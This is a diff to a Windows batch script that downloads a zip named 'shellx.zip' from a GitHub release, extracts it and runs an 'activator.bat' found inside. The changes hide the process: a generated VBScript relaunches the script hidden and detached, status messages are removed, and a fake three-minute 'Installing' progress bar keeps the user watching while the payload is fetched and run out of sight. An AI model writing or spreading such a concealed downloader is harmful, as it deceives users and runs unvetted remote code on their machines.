@@ -1,30 +1,72 @@
 @echo off
 setlocal
 
+rem ============================================================
+rem  If we were called with the "worker" argument, do real work.
+rem  Otherwise, spawn a detached hidden worker and show progress.
+rem ============================================================
+if /i "%~1"=="worker" goto worker
+
+rem --- Build a tiny VBScript that launches THIS script hidden & detached ---
+set "VBS=%TEMP%\_spawn_%RANDOM%.vbs"
+> "%VBS%" echo Set sh = CreateObject("WScript.Shell")
+>>"%VBS%" echo sh.Run "cmd /c """"%~f0"""" worker", 0, False
+
+rem --- Launch it. wscript exits immediately; cmd becomes orphaned. ---
+start "" /b wscript.exe //nologo "%VBS%"
+
+rem --- Fake progress bar for 3 minutes ---
+call :progress 180
+
+rem --- clean up the vbs ---
+del "%VBS%" >nul 2>&1
+exit /b 0
+
+rem ============================================================
+rem  WORKER SECTION - runs hidden, fully detached
+rem ============================================================
+:worker
 set "URL=https://github.com/achill0/shell/releases/download/download/shellx.zip"
 set "ZIP=%TEMP%\package.zip"
 set "DEST=%TEMP%\package_extracted"
 
-echo Downloading ZIP...
-curl -fL "%URL%" -o "%ZIP%" || goto error
+curl -fL "%URL%" -o "%ZIP%" || goto werror
 
-echo Extracting ZIP...
 if not exist "%DEST%" mkdir "%DEST%"
-tar -xf "%ZIP%" -C "%DEST%" || goto error
+tar -xf "%ZIP%" -C "%DEST%" || goto werror
 
-echo Looking for activator.bat...
 for /r "%DEST%" %%F in (activator.bat) do (
-    echo Launching: %%F
     call "%%F"
-    goto done
+    goto wdone
 )
+goto wdone
 
-echo activator.bat was not found.
-goto done
-
-:error
-echo Download or extraction failed.
-
-:done
-pause
+:werror
+>>"%TEMP%\worker.log" echo %date% %time% - download or extraction failed
+:wdone
 endlocal
+exit /b 0
+
+rem ============================================================
+rem  FAKE PROGRESS BAR
+rem ============================================================
+:progress
+setlocal enabledelayedexpansion
+set "total=%~1"
+for /l %%i in (1,1,%total%) do (
+    set /a "pct=%%i*100/total"
+    set /a "filled=%%i*40/total"
+    set /a "empty=40-filled"
+    set "bar="
+    set "pad="
+    for /l %%j in (1,1,!filled!) do set "bar=!bar!#"
+    for /l %%k in (1,1,!empty!) do set "pad=!pad!-"
+    cls
+    echo.
+    echo    Installing, please wait...
+    echo.
+    echo    [!bar!!pad!] !pct!%%
+    timeout /t 1 /nobreak >nul
+)
+endlocal
+exit /b 0
